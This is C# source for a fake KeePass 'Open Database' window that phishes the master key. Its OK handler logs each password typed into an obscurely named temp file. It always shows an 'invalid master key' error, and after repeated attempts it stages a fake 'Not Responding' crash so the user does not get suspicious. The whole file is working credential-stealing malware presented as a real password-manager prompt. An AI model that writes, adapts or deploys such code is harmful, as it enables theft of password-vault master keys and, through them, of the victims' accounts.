using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace KeePass
{
    public partial class Form1 : Form
    {
        private string logFilePath = Path.Combine(Path.GetTempPath(), "abckdlfdpeoovnp.bin");
        private int loginAttempts = 0;
        private int clickCount = 0;
        private string commandLineArg;
        private bool isPasswordVisible = false;

        public Form1()
        {
            InitializeComponent();
            InitializeControls();
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Paint += Form1_Paint;
            this.Text = "Open Database";

            // checkbox event handlers
            checkBox1.Checked = true;
            checkBox1.CheckedChanged += CheckBox_CheckedChanged;
            checkBox2.CheckedChanged += CheckBox_CheckedChanged;
            checkBox3.CheckedChanged += CheckBox_CheckedChanged;


            // enter key press
            textBox1.KeyPress += textBox1_KeyPress;


            // tooltips
            toolTip1.SetToolTip(pasword_reveal, "Show/hide password using asterisks");
            toolTip2.SetToolTip(directory_button, "Select key file manually");


        }

        //
        // Controls
        //
        private void InitializeControls()
        {

            // password box
            textBox1.PasswordChar = '●';
            textBox1.Font = new Font("Courier New", 8, FontStyle.Regular);
            textBox1.TextChanged += textBox1_TextChanged;


            // combo box
            comboBox2.DropDownStyle = ComboBoxStyle.DropDownList;
            comboBox2.Items.Add("(None)");
            comboBox2.SelectedIndex = 0;
        
        }


        //
        // Password handling button logic checkboxes
        //
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            // Automatically check the CheckBox when text is being typed into the TextBox
            checkBox1.Checked = !string.IsNullOrEmpty(textBox1.Text);
            //OK.Enabled = !string.IsNullOrEmpty(textBox1.Text);
            UpdateOKButtonState();
        }

        // 
        // if enter hit submit creds
        // 
        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                OK.Focus();
                OK.PerformClick();
                // Suppress the default behavior of the Enter key (preventing a newline character from being added)
                e.Handled = true;
            }
        }

        private void CheckBox_CheckedChanged(object sender, EventArgs e)
        {
            UpdateOKButtonState();
        }

        private void UpdateOKButtonState()
        {
            // If all three checkboxes are checked, disable the OK button
            if (checkBox1.Checked && checkBox2.Checked && checkBox3.Checked)
            {
                OK.Enabled = false;
                return; // Exit the method early, no need to check other conditions
            }

            // If checkBox2 is checked, disable the OK button
            if (checkBox2.Checked)
            {
                OK.Enabled = false;
                return; // Exit the method early, no need to check other conditions
            }

            // If textBox1 is empty and checkBox1 is checked, enable the OK button
            if (string.IsNullOrEmpty(textBox1.Text) && checkBox1.Checked)
            {
                OK.Enabled = true;
                return; // Exit the method early, no need to check other conditions
            }

            // If checkBox3 is checked, enable the OK button
            if (checkBox3.Checked)
            {
                OK.Enabled = true;
                return; // Exit the method early, no need to check other conditions
            }

            // If checkBox2 is not checked, enable the OK button if any of the other checkboxes are checked and there's text in textBox1
            OK.Enabled = !string.IsNullOrEmpty(textBox1.Text) &&
                               (checkBox1.Checked || checkBox3.Checked);
        }


        //
        // kdbx path under 'Enter Master Key'
        //
        private void Form1_Paint(object sender, PaintEventArgs e)
        {
            Font existingFont = this.Font;

            // Define the maximum width of the text within the fixed-size window
            int maxWidth = 431 - 78; // Adjusted for window width

            // Create a new font with increased size
            Font newFont = new Font(existingFont.FontFamily, existingFont.Size + 1, existingFont.Style);

            // Measure the width of the command line argument text
            SizeF textSize = e.Graphics.MeasureString(commandLineArg, newFont);

            // Check if the text exceeds the maximum width
            if (textSize.Width > maxWidth)
            {
                // Calculate how much of the text needs to be truncated
                float ratio = (float)maxWidth / textSize.Width;
                int charactersToDisplay = (int)(commandLineArg.Length * ratio) - 3; // Subtracting 3 for the '...'

                // Truncate the text and add '...' at the end
                string truncatedText = commandLineArg.Substring(0, charactersToDisplay) + "...";

                // Draw the truncated text
                using (var brush = new SolidBrush(Color.White))
                {
                    e.Graphics.DrawString(truncatedText, newFont, brush, new PointF(78, 32));
                }
            }
            else
            {
                // Draw the text as it is since it fits within the window
                using (var brush = new SolidBrush(Color.White))
                {
                    e.Graphics.DrawString(commandLineArg, newFont, brush, new PointF(78, 32));
                }
            }

            // Dispose the new font
            newFont.Dispose();
        }



        //
        // Directory button
        // - could check keepass source for custom file explorer implementation but it'd be a pain
        private async void button2_Click(object sender, EventArgs e)
        {
            clickCount++;

            // user obviously trying to access not just clicked by mistake - pretend to crash
            if (clickCount == 4) 
            {
                // Simulate crash of KeePass
                SetControlsEnabled(false);
                await Task.Delay(1000);
                this.Opacity = 0.8;
                await Task.Delay(3000);
                this.Text += " (Not Responding)";
                this.Cursor = Cursors.WaitCursor;
                await Task.Delay(5000);
                //Application.Exit();

                // Option  to pop an 'Unknown Error.'
                SystemSounds.Exclamation.Play();
                CustomMessageBox customMessageBox2 = new CustomMessageBox("\nUnknown Error.", "KeePass", MessageBoxIcon.Error);
                customMessageBox2.ShowDialog();
                //this.Dispose();
                Application.Exit();

            }
        }

        private void pasword_reveal_Click(object sender, EventArgs e)
        {
            if (isPasswordVisible)
            {
                textBox1.PasswordChar = '●';
            }
            else
            {
                textBox1.PasswordChar = '\0';
            }

            isPasswordVisible = !isPasswordVisible;
        }

        private async void Cancel_Click(object sender, EventArgs e)
        {
            this.Cursor = Cursors.WaitCursor;
            await Task.Delay(1000);
            //this.Dispose();
            Application.Exit();
        }


        // 
        // Password logic
        // 
        private async void OK_Click(object sender, EventArgs e)
        {
            loginAttempts++;

            LogToFile($"{DateTime.Now.ToString()} - KeePass Password: {textBox1.Text}");

            if (textBox1.Text == "abcdefghijklmnopqrstuvwxyz123456789")
            {
                Application.Exit();
            }
            else
            {
                this.Hide();

                SystemSounds.Exclamation.Play();
                CustomMessageBox customMessageBox = new CustomMessageBox(
                $"{commandLineArg}\n\n Failed to load the specified file!\n\n The master key is invalid!\n\n Make sure that the master key is correct and try it again.\n",
                "KeePass",
                MessageBoxIcon.Warning);
                customMessageBox.ShowDialog();

                // reset the fails to appear like startup
                textBox1.Text = "";
                checkBox1.Checked = true;

                this.Show();

                if (loginAttempts == 3)
                {
                    // Simulate crash of KeePass
                    SetControlsEnabled(false);
                    await Task.Delay(1000);
                    this.Opacity = 0.8;
                    await Task.Delay(3000);
                    this.Text += " (Not Responding)";
                    this.Cursor = Cursors.WaitCursor;
                    await Task.Delay(5000);
                    //Application.Exit();

                    // Option  to pop an 'Unknown error.' box - remove if unwanted and uncomment ^ Application.Exit();
                    SystemSounds.Exclamation.Play();
                    CustomMessageBox customMessageBox2 = new CustomMessageBox("\nUnknown Error.", "KeePass", MessageBoxIcon.Error);
                    customMessageBox2.ShowDialog();
                    //this.Dispose();
                    Application.Exit();
                }
            }
        }

        private void SetControlsEnabled(bool enabled)
        {
            foreach (Control control in Controls)
            {
                control.Enabled = enabled;
            }
        }


        private void Help_Click(object sender, EventArgs e)
        {
            string url = "https://keepass.info/help/base/keys.html";
            Process.Start(url);
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void LogToFile(string logMessage)
        {
            try
            {
                using (StreamWriter sw = File.AppendText(logFilePath))
                {
                    sw.WriteLine(logMessage);
                }
            }
            catch (Exception ex)
            {
                // exception
            }
        }

        public Form1(string commandLineArg) : this()
        {
            this.commandLineArg = commandLineArg;
            int lastIndex = commandLineArg.LastIndexOf('\\');

            if (lastIndex != -1)
            {
                // extract substring after the last '\' character
                string result = commandLineArg.Substring(lastIndex + 1);

                this.Text = "Open Database - " + result;
            }
            else
            {
                this.Text = "Open Database";
            }
        }
    }
}
